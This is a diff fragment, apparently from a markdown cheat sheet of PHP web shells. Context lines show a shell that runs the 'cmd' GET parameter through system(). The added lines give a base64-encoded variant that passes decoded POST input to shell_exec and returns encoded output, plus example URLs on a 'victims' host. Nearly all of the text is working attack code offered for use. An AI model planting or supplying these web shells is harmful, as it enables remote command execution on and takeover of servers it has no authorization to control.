@@ -43,4 +43,11 @@ echo "<pre>";
 system($_GET['cmd']);
 echo "</pre>";
 ?>
+#http://victims.site.com/phpwebshell.gif?cmd=dir
+```
+
+Base64 Encoded PHP webshell
+```php
+<?php $c=shell_exec(base64_decode($_POST['cmd'])); echo base64_encode($c);?>
+#http://victims.site.com/phpwebshell.php?cmd=dir
 ```
